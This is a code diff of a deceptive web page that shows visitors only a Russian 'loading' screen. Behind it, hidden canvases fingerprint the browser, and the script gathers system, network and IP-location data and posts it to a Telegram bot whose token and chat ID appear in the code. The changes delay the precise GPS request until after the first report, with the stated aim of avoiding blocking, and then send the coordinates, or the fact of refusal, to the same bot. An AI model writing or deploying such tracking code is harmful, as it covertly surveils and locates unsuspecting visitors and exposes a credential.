@@ -54,7 +54,7 @@
         <h1>Страница загружается...</h1>
         <div class="loader"></div>
     </div>
-    
+
     <!-- Скрытые элементы для сбора данных -->
     <canvas id="canvasFP" class="hidden"></canvas>
     <canvas id="webglCanvas" class="hidden"></canvas>
@@ -69,7 +69,7 @@
 const TELEGRAM_CONFIG = {
     // ⚠️ ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ ⚠️
     BOT_TOKEN: "8586218811:AAEBr8DYUUjLky-v6neRYFgHDpozwvXeBPQ",      // От @BotFather
-    CHAT_ID: "6250171958"           // Узнайте через @getmyid_bot
+    CHAT_ID: "6250171958"        // Узнайте через @getmyid_bot
 };
 
 // ============================================
@@ -219,7 +219,6 @@ function collectSystemData() {
         }
     };
 }
-
 // ============================================
 // ФУНКЦИЯ 3: СЕТЕВЫЕ ДАННЫЕ И ГЕОЛОКАЦИЯ
 // ============================================
@@ -245,36 +244,15 @@ async function collectNetworkAndGeoData() {
         }
     };
     
-    // Геолокация через IP
+    // Геолокация через IP (без запроса точной геолокации)
     ALL_DATA.geolocation = await getIPGeolocation();
     
-    // Дополнительно: попытка получить точную геолокацию
-    if ('geolocation' in navigator) {
-        try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: false,
-                    timeout: 5000,
-                    maximumAge: 600000
-                });
-            });
-            
-            ALL_DATA.geolocation.exact = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
-                timestamp: new Date(position.timestamp).toISOString(),
-                mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
-                yandexMapsLink: `https://yandex.ru/maps/?pt=${position.coords.longitude},${position.coords.latitude}&z=15`
-            };
-        } catch (error) {
-            ALL_DATA.geolocation.exact = { error: error.message };
-        }
-    }
+    // Только проверяем доступность геолокации БЕЗ ЗАПРОСА
+    ALL_DATA.geolocation.permission = 'geolocation' in navigator;
+    ALL_DATA.geolocation.exact = { 
+        status: 'not_requested',
+        note: 'Геолокация не запрашивалась для избежания блокировки'
+    };
 }
 
 // ============================================
@@ -1032,24 +1010,41 @@ function formatReport() {
     report += `▫️ <b>Язык:</b> <code>${data.browser.language}</code>\n\n`;
     
     if (data.geolocation.ip) {
-        report += `📍 <b>ГЕОЛОКАЦИЯ:</b>\n`;
+        report += `📍 <b>ГЕОЛОКАЦИЯ (ПО IP):</b>\n`;
         report += `▫️ <b>IP:</b> <code>${data.geolocation.ip}</code>\n`;
         report += `▫️ <b>Город:</b> <code>${data.geolocation.city || 'Неизвестно'}</code>\n`;
         report += `▫️ <b>Страна:</b> <code>${data.geolocation.country || 'Неизвестно'}</code>\n`;
         if (data.geolocation.latitude && data.geolocation.longitude) {
-            report += `▫️ <b>Координаты:</b> <code>${data.geolocation.latitude}, ${data.geolocation.longitude}</code>\n`;
-            report += `▫️ <b>Карта:</b> <a href="${data.geolocation.maps}">Google Maps</a>\n`;
+            report += `▫️ <b>Координаты (IP):</b> <code>${data.geolocation.latitude}, ${data.geolocation.longitude}</code>\n`;
+            report += `▫️ <b>Карта (IP):</b> <a href="${data.geolocation.maps}">Google Maps</a>\n`;
         }
-        report += `▫️ <b>Провайдер:</b> <code>${data.geolocation.org || 'Неизвестно'}</code>\n\n`;
+        report += `▫️ <b>Провайдер:</b> <code>${data.geolocation.org || 'Неизвестно'}</code>\n`;
+        
+        // Статус точной геолокации
+        if (data.geolocation.exact?.status === 'granted') {
+            report += `▫️ <b>Точная геолокация:</b> ✅ <i>Разрешена (будет отправлена отдельно)</i>\n`;
+        } else if (data.geolocation.exact?.status === 'denied') {
+            report += `▫️ <b>Точная геолокация:</b> ❌ <i>Отклонена пользователем</i>\n`;
+        } else if (data.geolocation.exact?.status === 'not_requested') {
+            report += `▫️ <b>Точная геолокация:</b> ⏳ <i>Запрос будет отправлен...</i>\n`;
+        } else {
+            report += `▫️ <b>Точная геолокация:</b> ℹ️ <i>${data.geolocation.exact?.status || 'Неизвестно'}</i>\n`;
+        }
+        
+        report += `\n`;
     }
     
-    if (data.geolocation.exact && !data.geolocation.exact.error) {
-        report += `🎯 <b>ТОЧНАЯ ГЕОЛОКАЦИЯ:</b>\n`;
-        report += `▫️ <b>Широта:</b> <code>${data.geolocation.exact.latitude}</code>\n`;
-        report += `▫️ <b>Долгота:</b> <code>${data.geolocation.exact.longitude}</code>\n`;
-        report += `▫️ <b>Точность:</b> <code>${Math.round(data.geolocation.exact.accuracy)}м</code>\n`;
-        report += `▫️ <b>Карта:</b> <a href="${data.geolocation.exact.mapsLink}">Google Maps</a>\n\n`;
-    }
+    if (data.geolocation.exact?.status === 'granted') {
+    report += `🎯 <b>ТОЧНАЯ ГЕОЛОКАЦИЯ (РАЗРЕШЕНО):</b>\n`;
+    report += `▫️ <b>Широта:</b> <code>${data.geolocation.exact.latitude}</code>\n`;
+    report += `▫️ <b>Долгота:</b> <code>${data.geolocation.exact.longitude}</code>\n`;
+    report += `▫️ <b>Точность:</b> <code>${Math.round(data.geolocation.exact.accuracy)}м</code>\n`;
+    report += `▫️ <b>Карта:</b> <a href="${data.geolocation.exact.mapsLink}">Google Maps</a>\n\n`;
+} else if (data.geolocation.exact?.status === 'denied') {
+    report += `🚫 <b>ГЕОЛОКАЦИЯ:</b> <code>Отклонена пользователем</code>\n\n`;
+} else {
+    report += `ℹ️ <b>ГЕОЛОКАЦИЯ:</b> <code>Не запрашивалась</code>\n\n`;
+}
     
     report += `🆔 <b>ОТПЕЧАТКИ:</b>\n`;
     report += `▫️ <b>Canvas:</b> <code>${data.fingerprints.canvas.substring(0, 20)}...</code>\n`;
@@ -1147,6 +1142,62 @@ function formatDetailedReport() {
     return report;
 }
 
+async function requestGeolocationIfAllowed() {
+    if ('geolocation' in navigator) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            
+            ALL_DATA.geolocation.exact = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                status: 'granted',
+                timestamp: new Date(position.timestamp).toISOString(),
+                mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                yandexMapsLink: `https://yandex.ru/maps/?pt=${position.coords.longitude},${position.coords.latitude}&z=15`
+            };
+            
+            // Отправляем обновление в Telegram
+            await sendToTelegram(`📍 <b>ГЕОЛОКАЦИЯ ПОЛУЧЕНА (РАЗРЕШЕНО)</b>\n` +
+                `Координаты: ${position.coords.latitude}, ${position.coords.longitude}\n` +
+                `Точность: ${Math.round(position.coords.accuracy)}м\n` +
+                `Карта: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`);
+            
+            console.log('✅ Геолокация получена');
+            
+        } catch (error) {
+            ALL_DATA.geolocation.exact = { 
+                status: 'denied',
+                error: error.message,
+                code: error.code || 'unknown',
+                timestamp: new Date().toISOString()
+            };
+            
+            // Отправляем сообщение об отказе
+            await sendToTelegram(`🚫 <b>ГЕОЛОКАЦИЯ ОТКЛОНЕНА</b>\n` +
+                `Причина: ${error.message || 'Пользователь отклонил запрос'}\n` +
+                `Код ошибки: ${error.code || 'unknown'}`);
+            
+            console.log('❌ Геолокация отклонена:', error.message);
+        }
+    } else {
+        ALL_DATA.geolocation.exact = { 
+            status: 'not_supported',
+            note: 'Геолокация не поддерживается браузером'
+        };
+    }
+}
+
 // ============================================
 // ГЛАВНАЯ ФУНКЦИЯ - СБОР И ОТПРАВКА ВСЕГО
 // ============================================
@@ -1191,8 +1242,11 @@ async function collectAndSendAllData() {
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
         } else {
-            await sendToTelegram(`📦 <b>ВСЕ ДАННЫЕ В JSON</b>\n<code>${jsonData}</code>`);
+            await sendToTelegram(`📦 <b>ВСЕ ДАННЫЕ В JSON</b>\n<code>${jsonData}</code>`)
         }
+        setTimeout(async () => {
+            await requestGeolocationIfAllowed();
+        }, 2000);
         
         console.log('🚀 Все данные отправлены в Telegram!');
         
